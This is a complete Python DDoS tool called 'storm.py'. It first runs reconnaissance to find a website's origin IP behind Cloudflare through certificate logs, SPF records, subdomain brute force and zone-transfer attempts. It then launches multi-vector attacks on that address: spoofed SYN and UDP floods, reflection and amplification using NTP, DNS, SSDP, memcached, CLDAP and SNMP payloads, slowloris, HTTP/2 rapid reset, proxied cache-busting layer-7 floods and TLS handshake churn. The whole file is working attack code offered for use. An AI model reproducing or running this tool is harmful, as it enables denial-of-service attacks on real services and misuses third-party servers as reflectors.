#!/usr/bin/env python3
# storm.py — pressure engine with origin discovery | python3.11+ | linux
# spoofed/raw modes require root
import argparse, asyncio, itertools, ipaddress, json, os, random, re
import socket, ssl, struct, sys, threading, time
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse

# ---------------------------------------------------------------- utils
UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
]

def rand_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

def rand_ua():
    return random.choice(UAS)

def checksum(data):
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return (\~s) & 0xffff

def resolve(host):
    try:
        return socket.getaddrinfo(host, None, socket.AF_INET)[0][4][0]
    except Exception:
        return None

def http_get(url, timeout=10, max_bytes=4 * 1024 * 1024):
    import urllib.request
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    req = urllib.request.Request(url, headers={"User-Agent": rand_ua()})
    return urllib.request.urlopen(req, timeout=timeout, context=ctx).read(max_bytes)

# ---------------------------------------------------------------- dns (no deps)
def parse_name(data, off):
    labels, jumped, end = [], False, None
    try:
        while True:
            l = data[off]
            if l & 0xc0 == 0xc0:
                ptr = struct.unpack("!H", data[off:off + 2])[0] & 0x3fff
                if not jumped:
                    end = off + 2
                off, jumped = ptr, True
                continue
            if l == 0:
                if end is None:
                    end = off + 1
                break
            labels.append(data[off + 1:off + 1 + l].decode(errors="replace"))
            off += l + 1
    except Exception:
        return "", off
    return ".".join(labels), end

def parse_rrs(data, off, count):
    out = []
    while count > 0 and off + 11 <= len(data):
        try:
            _, off = parse_name(data, off)
            if off + 10 > len(data):
                break
            rtype, rclass, ttl, rdlen = struct.unpack("!HHIH", data[off:off + 10])
            off += 10
            rstart = off
            rdata = data[off:off + rdlen]
            if rtype == 1 and rdlen == 4:
                out.append({"type": "A", "value": socket.inet_ntoa(rdata)})
            elif rtype == 28 and rdlen == 16:
                out.append({"type": "AAAA", "value": socket.inet_ntop(socket.AF_INET6, rdata)})
            elif rtype == 2:
                n, _ = parse_name(data, rstart)
                out.append({"type": "NS", "value": n})
            elif rtype == 5:
                n, _ = parse_name(data, rstart)
                out.append({"type": "CNAME", "value": n})
            elif rtype == 15:
                n, _ = parse_name(data, rstart + 2)
                out.append({"type": "MX", "value": n, "pref": struct.unpack("!H", rdata[:2])[0]})
            elif rtype == 16:
                texts, i = [], 0
                while i < rdlen:
                    l = rdata[i]
                    texts.append(rdata[i + 1:i + 1 + l].decode(errors="replace"))
                    i += l + 1
                out.append({"type": "TXT", "value": " ".join(texts)})
            off = rstart + rdlen
        except Exception:
            break
        count -= 1
    return out

def dns_query(name, qtype=1, server="1.1.1.1", tcp=False, timeout=3):
    tid = random.randint(0, 0xffff)
    header = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0)
    qname = b"".join(bytes([len(p)]) + p.encode() for p in name.rstrip(".").split(".")) + b"\x00"
    query = qname + struct.pack("!HH", qtype, 1)
    try:
        if not tcp:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(timeout)
            s.sendto(header + query, (server, 53))
            data, _ = s.recvfrom(65535)
            s.close()
            return parse_rrs(data, 12 + len(qname) + 4, struct.unpack("!H", data[6:8])[0])
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((server, 53))
        msg = header + query
        s.sendall(struct.pack("!H", len(msg)) + msg)
        ln = struct.unpack("!H", s.recv(2))[0]
        data = b""
        while len(data) < ln:
            data += s.recv(ln - len(data))
        s.close()
        return parse_rrs(data, 12 + len(qname) + 4, 10 ** 6)
    except Exception:
        return []

def get_ns(domain):
    return [r["value"] for r in dns_query(domain, 2) if r.get("value")]

def get_txt(domain):
    return [r["value"] for r in dns_query(domain, 16) if r.get("value")]

def get_mx(domain):
    return [r for r in dns_query(domain, 15) if r.get("value")]

# ---------------------------------------------------------------- recon
SUBWORD = """mail vpn ftp ssl staging stg dev test api old www2 www3 direct origin
mx smtp imap pop owa remote git jira wiki blog shop cdn cdn2 static cdn-static
assets upload admin portal intranet hr payroll billing panel cp ns1 ns2 dns
backup db mysql api2 gateway proxy secure status support help alpha beta demo
mobile m app apps login signup mx2 mail2 webmail cpanel autodiscover autoconfig
caldav carddav jitsi meet conf conference video stream live edge edge1 edge2""".split()

def crt_sh(domain):
    try:
        j = json.loads(http_get(f"https://crt.sh/?q=%25.{domain}&output=json", timeout=25))
        names = set()
        for e in j:
            for f in (e.get("name_value", ""), e.get("common_name", "")):
                for n in f.split("\n"):
                    n = n.strip().lstrip("*.").lower()
                    if n and n.endswith(domain) and "*" not in n:
                        names.add(n)
        return names
    except Exception:
        return set()

def parse_spf(domain, depth=0):
    if depth > 3:
        return []
    ips = []
    for txt in get_txt(domain):
        if not txt.startswith("v=spf1"):
            continue
        for m in re.finditer(r"ip4:([\d./]+)|include:(\S+)|(?<=\s)a(?=\s)|(?<=\s)mx(?=\s)", txt):
            if m.group(1):
                ips.append(m.group(1))
            elif m.group(2):
                try:
                    ips += parse_spf(m.group(2).rstrip("."), depth + 1)
                except Exception:
                    pass
    return ips

def bruteforce_subs(domain, words, threads=32):
    found = []
    lock = threading.Lock()
    def probe(w):
        h = f"{w}.{domain}"
        try:
            ip = socket.getaddrinfo(h, None, socket.AF_INET)[0][4][0]
            with lock:
                found.append((h, ip))
        except Exception:
            pass
    with ThreadPoolExecutor(max_workers=threads) as ex:
        ex.map(probe, words)
    return found

def probe_origin(ip, domain, port=443, timeout=5):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(socket.create_connection((ip, port), timeout=timeout), server_hostname=domain)
        s.sendall(f"GET / HTTP/1.1\r\nHost: {domain}\r\nUser-Agent: {rand_ua()}\r\nAccept: */*\r\nConnection: close\r\n\r\n".encode())
        head = b""
        while b"\r\n\r\n" not in head:
            c = s.recv(4096)
            if not c:
                break
            head += c
            if len(head) > 65536:
                break
        s.close()
        h = head.decode(errors="replace")
        if "cf-ray" in h.lower() or "server: cloudflare" in h.lower():
            return None
        m = re.findall(r"(?i)server:\s*(\S+)", h)
        return f"{h.splitlines()[0] if h else '?'} | server={m[0] if m else '?'}"
    except Exception:
        return None

def full_recon(domain):
    print(f"[*] recon: {domain}")
    ns = get_ns(domain)
    cf = any("cloudflare" in n.lower() for n in ns)
    print(f"[*] ns: {', '.join(ns) or 'none'} -> cloudflare={cf}")
    print(f"[*] mx: {', '.join(r['value'] for r in get_mx(domain)) or 'none'}")
    spf_ips = parse_spf(domain)
    print(f"[*] spf/include ips: {', '.join(spf_ips) or 'none'}")

    candidates = set(spf_ips)
    subs = crt_sh(domain)
    print(f"[*] crt.sh: {len(subs)} subdomains")
    subs = set(subs) | {f"{w}.{domain}" for w in SUBWORD}
    brute = bruteforce_subs(domain, list(subs)) if subs else []
    resolved = {}
    for h, ip in brute:
        resolved[h] = ip
        candidates.add(ip)

    try:
        the_ns = ns[0] if ns else "1.1.1.1"
        axfr = dns_query(domain, 252, server=the_ns, tcp=True)
        for r in axfr:
            if r["type"] == "A" and r["value"] not in candidates:
                candidates.add(r["value"])
                print(f"[*] axfr leak: {r['value']}")
    except Exception:
        pass

    origins = []
    for ip in candidates:
        try:
            ipaddress.ip_address(ip)
        except Exception:
            continue
        r = probe_origin(ip, domain)
        if r:
            origins.append((ip, r))
            print(f"[+] ORIGIN CANDIDATE: {ip}  {r}")
    print(f"[*] origins found: {len(origins)}")
    return {"cloudflare": cf, "origins": origins, "subdomains": sorted(brute), "ns": ns}

# ---------------------------------------------------------------- packet builders
def tcp_checksum(src, dst, tcp):
    pseudo = struct.pack("!4s4sBBH", socket.inet_aton(src), socket.inet_aton(dst), 0, socket.IPPROTO_TCP, len(tcp))
    return checksum(pseudo + tcp)

def udp_checksum(src, dst, udp):
    pseudo = struct.pack("!4s4sBBH", socket.inet_aton(src), socket.inet_aton(dst), 0, socket.IPPROTO_UDP, len(udp))
    return checksum(pseudo + udp)

def build_ip(src, dst, proto, payload, ident=None):
    n = len(payload)
    ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + n, ident or random.randint(0, 0xffff),
                     0x4000, 64, proto, 0, socket.inet_aton(src), socket.inet_aton(dst))
    return ip[:10] + struct.pack("!H", checksum(ip)) + ip[12:]

def build_syn(src, dst, sport, dport):
    tcp = struct.pack("!HHIIBBHHH", sport, dport, random.randint(0, 0xffffffff), 0,
                      5 << 4, 0x02, 65535, 0, 0)
    tcp = tcp[:16] + struct.pack("!H", tcp_checksum(src, dst, tcp)) + tcp[18:]
    return build_ip(src, dst, socket.IPPROTO_TCP, tcp)

def build_udp(src, dst, sport, dport, payload):
    udp = struct.pack("!HHHH", sport, dport, 8 + len(payload), 0) + payload
    udp = udp[:6] + struct.pack("!H", udp_checksum(src, dst, udp)) + udp[8:]
    return build_ip(src, dst, socket.IPPROTO_UDP, udp)

# amplification payloads
def ntp_monlist():
    return b"\x17\x00\x03\x2a" + b"\x00" * 20

def ntp_peers():
    return b"\x16\x00\x02\x00" + b"\x00" * 20

def dns_any(name, buf=4096):
    qname = b"".join(bytes([len(p)]) + p.encode() for p in name.split(".")) + b"\x00"
    return struct.pack("!HHHHHH", random.randint(0, 0xffff), 0x0100, 1, 0, 0, 0) + qname + \
           struct.pack("!HH", 255, 1) + b"\x00" + struct.pack("!HHIH", 41, buf, 0, 0)

def dns_version_bind(buf=4096):
    qname = b"\x07version\x04bind\x00"
    return struct.pack("!HHHHHH", random.randint(0, 0xffff), 0x0100, 1, 0, 0, 0) + qname + \
           struct.pack("!HH", 16, 3) + b"\x00" + struct.pack("!HHIH", 41, buf, 0, 0)

def ssdp():
    return b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n"

def memcached_stats():
    return b"stats\r\n"

def chargen():
    return b"X" * 64

def wsdiscovery():
    return (b'<?xml version="1.0"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" '
            b'xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing"><soap:Header>'
            b'<wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</wsa:Action>'
            b'<wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To></soap:Header>'
            b'<soap:Body><Probe xmlns="http://schemas.xmlsoap.org/ws/2005/04/discovery"/></soap:Body></soap:Envelope>')

def ber_tlv(tag, payload):
    if len(payload) < 0x80:
        return bytes([tag, len(payload)]) + payload
    return bytes([tag, 0x81, len(payload)]) + payload

def snmp_getbulk():
    oid = b"\x2b\x06\x01\x02\x01\x01"
    vb = ber_tlv(0x30, ber_tlv(0x06, oid) + b"\x05\x00")
    vbl = ber_tlv(0x30, vb)
    body = ber_tlv(0x02, b"\x01\x02\x03\x04") + ber_tlv(0x02, b"\x00") + ber_tlv(0x02, b"\x00") + \
           ber_tlv(0x02, b"\x01") + ber_tlv(0x02, b"\x19") + vbl
    return ber_tlv(0x30, ber_tlv(0x02, b"\x01") + ber_tlv(0x04, b"public") + ber_tlv(0xa5, body))

def cldap_search():
    return bytes.fromhex("3025020101632004000a01000a0100020100020100010100870b610930070400040004003000")

AMP_SERVICES = {
    "ntp":     (123,   ntp_monlist),
    "ntp2":    (123,   ntp_peers),
    "dns":     (53,    lambda: dns_any("example.com", 4096)),
    "dns2":    (53,    dns_version_bind),
    "ssdp":    (1900,  ssdp),
    "memc":    (11211, memcached_stats),
    "chargen": (19,    chargen),
    "wsd":     (3702,  wsdiscovery),
    "snmp":    (161,   snmp_getbulk),
    "cldap":   (389,   cldap_search),
}

# ---------------------------------------------------------------- attack engines
def raw_socket(proto, spoof):
    if not spoof:
        return None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, proto)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        return s
    except PermissionError:
        print("[!] root required for spoofed/raw modes — falling back to unspoofed sockets")
        return None

def wait(stop, label):
    print(f"[*] {label} running (duration={stop.duration}s) — ctrl+c to stop early")
    try:
        stop.wait()
    except KeyboardInterrupt:
        stop.set()

def monitor(stop, label, counter):
    last = next(counter)
    t0 = time.time()
    print(f"[*] {label} running (duration={stop.duration}s) — ctrl+c to stop early")
    while not stop.wait(5):
        now = next(counter)
        dt = time.time() - t0
        print(f"[*] {label}: {(now - last) / max(dt, 0.001):,.0f} req/s")
        last, t0 = now, time.time()
    stop.set()

def make_stop(duration):
    s = threading.Event()
    s.duration = duration
    if duration and duration > 0:
        threading.Timer(duration, s.set).start()
    return s

def run_syn(args, stop):
    ip = resolve(args.ip or args.target)
    if not ip:
        print("[!] cannot resolve target")
        return
    s = raw_socket(socket.IPPROTO_TCP, args.spoof)
    if s is None:
        return run_udp(args, stop)
    def worker():
        while not stop.is_set():
            s.sendto(build_syn(rand_ip(), ip, random.randint(1024, 65535), args.port), (ip, 0))
    threads = [threading.Thread(target=worker) for _ in range(args.threads)]
    [t.start() for t in threads]
    wait(stop, "syn flood")
    [t.join() for t in threads]

def run_udp(args, stop):
    ip = resolve(args.ip or args.target)
    if not ip:
        return
    s = raw_socket(socket.IPPROTO_UDP, args.spoof)
    def worker():
        d = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not stop.is_set():
            port = random.randint(args.port_min, args.port_max)
            data = os.urandom(random.randint(1, args.size))
            if s is not None:
                s.sendto(build_udp(rand_ip(), ip, random.randint(1024, 65535), port, data), (ip, 0))
            else:
                d.sendto(data, (ip, port))
        d.close()
    threads = [threading.Thread(target=worker) for _ in range(args.threads)]
    [t.start() for t in threads]
    wait(stop, "udp flood")
    [t.join() for t in threads]

def run_amp(args, stop):
    ip = resolve(args.victim)
    if not ip:
        return
    reflectors = []
    with open(args.reflectors) as f:
        for line in f:
            line = line.split("#")[0].strip()
            if not line:
                continue
            parts = line.split(":")
            reflectors.append((parts[0], int(parts[1]) if len(parts) > 1 else None))
    services = args.services.split(",")
    s = raw_socket(socket.IPPROTO_UDP, True)
    if s is None:
        print("[!] amp without spoofed src sends responses to you — requires root, aborting")
        return
    def worker():
        while not stop.is_set():
            refl, over_port = random.choice(reflectors)
            name = random.choice(services)
            port, builder = AMP_SERVICES[name]
            payload = builder()
            s.sendto(build_udp(ip, refl, random.randint(1024, 65535),
                               over_port or port, payload), (refl, 0))
    threads = [threading.Thread(target=worker) for _ in range(args.threads)]
    [t.start() for t in threads]
    wait(stop, f"amplification ({services})")
    [t.join() for t in threads]

def run_slow(args, stop):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    def worker():
        while not stop.is_set():
            try:
                s = socket.create_connection((args.host, args.port), timeout=10)
                if args.tls:
                    s = ctx.wrap_socket(s, server_hostname=args.host)
                s.sendall(f"GET /{random.randint(0, 999999)} HTTP/1.1\r\nHost: {args.host}\r\nUser-Agent: {rand_ua()}\r\n".encode())
                last = time.time()
                while not stop.is_set():
                    if time.time() - last > random.uniform(5, 15):
                        s.sendall(f"X-{random.randint(0, 10**6)}: {os.urandom(8).hex()}\r\n".encode())
                        last = time.time()
                    time.sleep(0.1)
            except Exception:
                time.sleep(0.1)
    threads = [threading.Thread(target=worker) for _ in range(args.conns)]
    [t.start() for t in threads]
    wait(stop, f"slowloris ({args.conns} conns)")
    [t.join() for t in threads]

# ---- http/2 rapid reset
def hpack_lit(name, value):
    return bytes([0x00, len(name)]) + name.encode() + bytes([len(value)]) + value.encode()

def h2_frame(ftype, flags, sid, payload=b""):
    return struct.pack("!I", len(payload))[1:] + bytes((ftype, flags)) + \
           struct.pack("!I", sid & 0x7fffffff) + payload

def h2_burst(host, streams):
    hb = b""
    for n, v in ((":method", "GET"), (":scheme", "https"), (":path", "/"), (":authority", host)):
        hb += hpack_lit(n, v)
    return (b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n" + h2_frame(0x4, 0, 0) + b"".join(
        h2_frame(0x1, 0x4, sid, hb) + h2_frame(0x3, 0, sid, struct.pack("!I", 0x8))
        for sid in range(1, streams * 2, 2)))

async def h2_worker(host, port, stop, streams, conn_life, rps):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    burst = h2_burst(host, streams)
    while not stop.is_set():
        try:
            r, w = await asyncio.open_connection(host, port, ssl=ctx, server_hostname=host, alpn_protocols=["h2"])
            t0 = time.time()
            while time.time() - t0 < conn_life and not stop.is_set():
                w.write(burst)
                await w.drain()
                next(rps)
            w.close()
        except Exception:
            await asyncio.sleep(0.01)

def run_h2(args, stop):
    rps = itertools.count()
    conn_host = args.resolve_ip or args.host
    async def go():
        await asyncio.gather(*(h2_worker(conn_host, args.port, stop, args.streams,
                                         args.conn_life, rps) for _ in range(args.threads)))
    t = threading.Thread(target=lambda: asyncio.run(go()))
    t.start()
    monitor(stop, "http2 rapid reset", rps)
    stop.set()
    t.join()

# ---- layer 7
async def open_tunnel(proxy, host, port):
    u = urlparse(proxy if "://" in proxy else "http://" + proxy)
    ph, pp = u.hostname, u.port or (443 if u.scheme == "https" else 80)
    r, w = await asyncio.open_connection(ph, pp)
    if u.scheme.startswith("http"):
        w.write(f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n".encode())
        await w.drain()
        head = b""
        while b"\r\n\r\n" not in head:
            head += await r.read(2048)
        if b" 200 " not in head:
            w.close()
            raise ConnectionError("proxy refused CONNECT")
    else:  # socks5
        w.write(b"\x05\x01\x00")
        await w.drain()
        ver, method = await r.readexactly(2)
        if ver != 5:
            raise ConnectionError("bad socks greeting")
        ip = socket.inet_aton(host) if host.count(".") == 3 else None
        if ip:
            addr = b"\x01" + ip
        else:
            addr = b"\x03" + bytes([len(host)]) + host.encode()
        w.write(b"\x05\x01\x00" + addr + struct.pack("!H", port))
        await w.drain()
        bnd = await r.readexactly(4)
        if bnd[1] != 0:
            w.close()
            raise ConnectionError("socks connect failed")
        if bnd[3] == 1:
            await r.readexactly(6)
        elif bnd[3] == 4:
            await r.readexactly(18)
        elif bnd[3] == 3:
            ln = (await r.readexactly(1))[0]
            await r.readexactly(ln + 2)
    return r, w

async def l7_pump(r, w, u, host, idx):
    path = u.path or "/"
    if u.query:
        path += "?" + u.query
    path += ("&" if u.query else "?") + "cb=" + "".join(random.choices("0123456789abcdef", k=8))
    body = os.urandom(random.randint(1, 4096)) if random.random() < 0.3 else b""
    method = random.choice(["GET", "GET", "GET", "POST", "HEAD"])
    lines = [f"{method} {path} HTTP/1.1", f"Host: {host}",
             f"User-Agent: {rand_ua()}",
             "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
             "Accept-Language: en-US,en;q=0.9",
             "Cache-Control: no-cache, no-store, max-age=0",
             "Pragma: no-cache", f"X-Forwarded-For: {rand_ip()}",
             "Connection: keep-alive"]
    if body:
        lines.append(f"Content-Length: {len(body)}")
    w.write(("\r\n".join(lines) + "\r\n\r\n").encode() + body)
    await w.drain()
    head = b""
    while b"\r\n\r\n" not in head:
        try:
            c = await asyncio.wait_for(r.read(2048), 5)
        except Exception:
            return False
        if not c:
            return False
        head += c
        if len(head) > 65536:
            return False
    return True

async def l7_worker(idx, u, host, port, stop, proxies, interval, rps, tls_ctx):
    proxy = proxies[idx % len(proxies)] if proxies else None
    while not stop.is_set():
        try:
            if proxy:
                r, w = await open_tunnel(proxy, host, port)
                if u.scheme == "https":
                    await w.start_tls(tls_ctx, server_hostname=host)
            else:
                r, w = await asyncio.open_connection(
                    host, port, ssl=tls_ctx if u.scheme == "https" else None, server_hostname=host)
            ok = await l7_pump(r, w, u, host, idx)
            while ok and not stop.is_set():
                next(rps)
                if random.random() < 0.15:
                    break
                await asyncio.sleep(random.uniform(0, interval))
                ok = await l7_pump(r, w, u, host, idx)
            w.close()
        except Exception:
            await asyncio.sleep(0.05)

def run_l7(args, stop):
    u = urlparse(args.url)
    host = u.hostname
    port = u.port or (443 if u.scheme == "https" else 80)
    conn_host = args.resolve_ip or host
    proxies = []
    if getattr(args, "proxies", None):
        with open(args.proxies) as f:
            proxies = [l.strip() for l in f if l.strip() and not l.startswith("#")]
    rps = itertools.count()
    tls_ctx = ssl.create_default_context()
    tls_ctx.check_hostname = False
    tls_ctx.verify_mode = ssl.CERT_NONE
    async def go():
        await asyncio.gather(*(l7_worker(i, u, conn_host, port, stop, proxies,
                                         args.interval, rps, tls_ctx) for i in range(args.threads)))
    t = threading.Thread(target=lambda: asyncio.run(go()))
    t.start()
    monitor(stop, "l7 flood", rps)
    stop.set()
    t.join()

# ---- tls handshake churn
CIPHERS = ["ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-GCM-SHA256",
           "AES128-SHA", "ECDHE-RSA-CHACHA20-POLY1305"]

async def tls_worker(host, port, stop):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    while not stop.is_set():
        try:
            ctx.set_ciphers(random.choice(CIPHERS))
            ctx.alpn_protocols = ["http/1.1"]
            r, w = await asyncio.open_connection(host, port, ssl=ctx, server_hostname=host)
            w.write(f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n\r\n".encode())
            await w.drain()
            await asyncio.sleep(random.uniform(1, 8))
            w.close()
        except Exception:
            pass

def run_tls(args, stop):
    rps = itertools.count()
    async def go():
        await asyncio.gather(*(tls_worker(args.host, args.port, stop) for _ in range(args.threads)))
    t = threading.Thread(target=lambda: asyncio.run(go()))
    t.start()
    monitor(stop, "tls handshake flood", rps)
    stop.set()
    t.join()

# ---------------------------------------------------------------- orchestration
def cmd_attack(args):
    target = args.target if "://" in args.target else "http://" + args.target
    u = urlparse(target)
    domain = u.hostname
    rec = full_recon(domain)
    stop = make_stop(args.duration)
    vectors = args.vectors.split(",")
    targets = []
    if rec["origins"]:
        ip = rec["origins"][0][0]
        print(f"[+] attacking origin {ip} directly — cloudflare bypassed")
        targets.append(("origin", ip, domain))
    else:
        ip = resolve(domain)
        print(f"[*] origin hidden — attacking edge {ip} (dynamic-endpoint vectors only)")
        targets.append(("edge", ip, domain))

    # ensure shared attrs exist with sane defaults so every vector can read them
    if not hasattr(args, "threads") or args.threads is None:
        args.threads = 32
    if not hasattr(args, "streams") or args.streams is None:
        args.streams = 30000
    if not hasattr(args, "conn_life") or args.conn_life is None:
        args.conn_life = 5.0
    if not hasattr(args, "interval") or args.interval is None:
        args.interval = 0.05
    if not hasattr(args, "proxies"):
        args.proxies = None
    if not hasattr(args, "spoof"):
        args.spoof = True
    if not hasattr(args, "port_min"):
        args.port_min = 1
    if not hasattr(args, "port_max"):
        args.port_max = 65535
    if not hasattr(args, "size"):
        args.size = 1400
    if not hasattr(args, "conns"):
        args.conns = 2000
    if not hasattr(args, "tls"):
        args.tls = True

    threads = []
    for kind, ip, host in targets:
        for v in vectors:
            v = v.strip()
            if v == "syn":
                a = argparse.Namespace(**vars(args))
                a.ip, a.port, a.spoof = ip, 443, True
                threads.append(threading.Thread(target=run_syn, args=(a, stop)))
            elif v == "udp":
                a = argparse.Namespace(**vars(args))
                a.ip, a.port_min, a.port_max, a.size, a.spoof = ip, 1, 65535, 1400, True
                threads.append(threading.Thread(target=run_udp, args=(a, stop)))
            elif v == "h2":
                a = argparse.Namespace(**vars(args))
                a.host, a.port, a.resolve_ip = host, 443, ip
                threads.append(threading.Thread(target=run_h2, args=(a, stop)))
            elif v == "tls":
                a = argparse.Namespace(**vars(args))
                a.host, a.port = host, 443
                threads.append(threading.Thread(target=run_tls, args=(a, stop)))
            elif v == "slow":
                a = argparse.Namespace(**vars(args))
                a.host, a.port, a.tls, a.conns = host, 443, True, 2000
                threads.append(threading.Thread(target=run_slow, args=(a, stop)))
            elif v == "l7":
                a = argparse.Namespace(**vars(args))
                a.url, a.resolve_ip = f"{u.scheme}://{host}/", ip
                threads.append(threading.Thread(target=run_l7, args=(a, stop)))
    [t.start() for t in threads]
    try:
        while not stop.is_set():
            time.sleep(1)
    except KeyboardInterrupt:
        stop.set()
    [t.join() for t in threads]

def main():
    p = argparse.ArgumentParser(description="storm — pressure engine with origin discovery")
    sub = p.add_subparsers(dest="cmd", required=True)

    def base(sp):
        sp.add_argument("--duration", type=int, default=120)
        sp.add_argument("--threads", type=int, default=32)

    r = sub.add_parser("recon", help="find origin IP behind cloudflare")
    r.add_argument("--domain", required=True)

    a = sub.add_parser("attack", help="recon-first bypass + multi-vector")
    a.add_argument("--target", required=True)
    a.add_argument("--vectors", default="syn,udp,l7")
    a.add_argument("--duration", type=int, default=180)
    a.add_argument("--threads", type=int, default=32)
    a.add_argument("--streams", type=int, default=30000)
    a.add_argument("--conn-life", type=float, default=5.0)
    a.add_argument("--interval", type=float, default=0.05)
    a.add_argument("--proxies", help="file: socks5://ip:port or http://ip:port per line")
    a.add_argument("--spoof", action="store_true", default=True)

    s = sub.add_parser("syn", help="tcp syn flood (spoofed src)")
    s.add_argument("--ip", required=True); s.add_argument("--port", type=int, default=443)
    s.add_argument("--spoof", action="store_true"); base(s)

    u = sub.add_parser("udp", help="udp flood")
    u.add_argument("--ip", required=True)
    u.add_argument("--port-min", type=int, default=1)
    u.add_argument("--port-max", type=int, default=65535)
    u.add_argument("--size", type=int, default=1400)
    u.add_argument("--spoof", action="store_true"); base(u)

    am = sub.add_parser("amp", help="spoofed-source amplification")
    am.add_argument("--victim", required=True)
    am.add_argument("--reflectors", required=True, help="file: ip[:port] per line")
    am.add_argument("--services", default="ntp,dns,ssdp,wsd,chargen")
    base(am)

    sl = sub.add_parser("slow", help="slowloris")
    sl.add_argument("--host", required=True); sl.add_argument("--port", type=int, default=80)
    sl.add_argument("--conns", type=int, default=2000); sl.add_argument("--tls", action="store_true")
    sl.add_argument("--duration", type=int, default=600)

    h = sub.add_parser("h2", help="http/2 rapid reset")
    h.add_argument("--host", required=True); h.add_argument("--port", type=int, default=443)
    h.add_argument("--streams", type=int, default=30000)
    h.add_argument("--conn-life", type=float, default=5)
    h.add_argument("--resolve-ip", help="connect to origin ip, SNI=--host"); base(h)

    l = sub.add_parser("l7", help="cache-busting layer-7 flood")
    l.add_argument("--url", required=True); l.add_argument("--interval", type=float, default=0.05)
    l.add_argument("--proxies", help="file: socks5://ip:port or http://ip:port per line")
    l.add_argument("--resolve-ip", help="connect to origin ip, Host/SNI from --url"); base(l)

    t = sub.add_parser("tls", help="tls handshake churn")
    t.add_argument("--host", required=True); t.add_argument("--port", type=int, default=443); base(t)

    args = p.parse_args()
    if args.cmd == "recon":
        full_recon(args.domain)
    elif args.cmd == "attack":
        cmd_attack(args)
    else:
        stop = make_stop(args.duration)
        if args.cmd == "syn":
            run_syn(args, stop)
        elif args.cmd == "udp":
            run_udp(args, stop)
        elif args.cmd == "amp":
            run_amp(args, stop)
        elif args.cmd == "slow":
            run_slow(args, stop)
        elif args.cmd == "h2":
            run_h2(args, stop)
        elif args.cmd == "l7":
            run_l7(args, stop)
        elif args.cmd == "tls":
            run_tls(args, stop)

if __name__ == "__main__":
    main()